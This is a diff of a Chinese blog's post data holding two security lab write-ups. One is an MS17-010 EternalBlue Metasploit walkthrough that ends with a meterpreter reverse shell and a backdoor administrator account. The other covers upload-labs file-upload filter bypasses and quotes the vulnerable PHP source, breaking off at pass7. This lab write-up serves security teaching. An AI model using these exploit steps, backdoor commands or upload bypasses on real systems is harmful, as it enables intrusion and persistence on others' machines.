@@ -1559,6 +1559,66 @@ apt install <span class="hljs-keyword">vim</span></code></pre>
       </tags>
   </entry>
   <entry>
+    <title>网安作业1</title>
+    <url>/2020/09/27/homework/</url>
+    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
+
+<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
+<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
+<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
+<p>测试两台主机之间的通信情况</p>
+<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
+<p>使用msf前需要开启postgresql服务 </p>
+<p>开启服务：service postgresql start </p>
+<p>查看服务状态：service postgresql status</p>
+<p>开到绿色字体的active即为开启了</p>
+<p>初始化数据库：msfdb init </p>
+<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
+<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
+<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
+<p>输入search　MS17-010</p>
+<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
+<p>运行</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>
+
+<p>输入 show options  查看需要配置哪些信息</p>
+<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
+<p>RPORT 为目标端口号(445)</p>
+<p>LHOST 为监听主机IP(10.1.1.1)</p>
+<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
+<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
+<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
+<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>
+
+
+
+<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
+<p>成功获取shell</p>
+<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
+<p>查看ip地址验证是否为目标主机。</p>
+<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
+<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
+<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>
+
+<p>Username:test </p>
+<p>password:abc123.com</p>
+<p>将该用户加入管理员组，使其拥有管理员权限</p>
+<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>
+
+<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
+<p>目标主机上用户创建成功</p>
+<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
+<p>  <strong>实验结束</strong></p>
+]]></content>
+      <categories>
+        <category>网安作业</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>grpc</title>
     <url>/2023/02/07/grpc/</url>
     <content><![CDATA[<p>grpc入门</p>
@@ -1795,66 +1855,6 @@ protoc <span class="hljs-attribute">--go-grpc_out</span>=. .\server.proto</code>
       </categories>
       <tags>
         <tag>grpc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安作业1</title>
-    <url>/2020/09/27/homework/</url>
-    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
-
-<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
-<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
-<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
-<p>测试两台主机之间的通信情况</p>
-<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
-<p>使用msf前需要开启postgresql服务 </p>
-<p>开启服务：service postgresql start </p>
-<p>查看服务状态：service postgresql status</p>
-<p>开到绿色字体的active即为开启了</p>
-<p>初始化数据库：msfdb init </p>
-<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
-<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
-<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
-<p>输入search　MS17-010</p>
-<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
-<p>运行</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>
-
-<p>输入 show options  查看需要配置哪些信息</p>
-<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
-<p>RPORT 为目标端口号(445)</p>
-<p>LHOST 为监听主机IP(10.1.1.1)</p>
-<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
-<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
-<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
-<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>
-
-
-
-<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
-<p>成功获取shell</p>
-<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
-<p>查看ip地址验证是否为目标主机。</p>
-<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
-<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
-<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>
-
-<p>Username:test </p>
-<p>password:abc123.com</p>
-<p>将该用户加入管理员组，使其拥有管理员权限</p>
-<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>
-
-<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
-<p>目标主机上用户创建成功</p>
-<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
-<p>  <strong>实验结束</strong></p>
-]]></content>
-      <categories>
-        <category>网安作业</category>
-      </categories>
-      <tags>
-        <tag>msf</tag>
       </tags>
   </entry>
   <entry>
@@ -2818,6 +2818,618 @@ ITEM_PIPELINES = &#123;
       </tags>
   </entry>
   <entry>
+    <title>uploads-labs</title>
+    <url>/2020/09/16/uploads/</url>
+    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><span id="more"></span>
+
+
+
+<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
+<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
+<pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre>
+
+<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
+<p>抓包修改MIME即可</p>
+<p>知识点补充：</p>
+<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
+<pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
+<span class="hljs-built_in">text</span>/html
+image/jpeg
+image/png
+audio/mpeg
+audio/ogg
+audio/*
+video/mp4
+<span class="hljs-built_in">application</span>/*
+<span class="hljs-built_in">application</span>/json
+<span class="hljs-built_in">application</span>/javascript
+<span class="hljs-built_in">application</span>/ecmascript
+<span class="hljs-built_in">application</span>/octet-stream</code></pre>
+
+<p>更详细的解释，</p>
+<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre>
+
+<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
+<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
+<blockquote>
+<ul>
+<li>URL重写、自定义错误页面</li>
+<li>MIME类型配置</li>
+<li>访问权限控制等</li>
+<li>主要体现在伪静态的应用</li>
+<li>图片防盗链</li>
+<li>自定义404错误页面</li>
+<li>阻止/允许特定IP/IP段</li>
+<li>目录浏览与主页</li>
+<li>禁止访问指定文件类型</li>
+<li>文件密码保护</li>
+</ul>
+</blockquote>
+<pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
+<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
+<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>
+
+<p>这几句代码的意思：</p>
+<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
+<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
+<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
+<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
+        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
+        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
+        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
+        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
+        
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
+            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>本题与第十题完全一样，详细解答见第十题</p>
+<p><img src="/2020/09/16/uploads/5.png" alt></p>
+<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
+        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
+        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
+        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
+
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
+            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>仔细查看源码会发现少了下面的这段代码</p>
+<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre>
+
+<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
+<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
+        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
+        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
+        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
+        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
+        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
+        
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
+            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>跟第六关对比发现少了这句话</p>
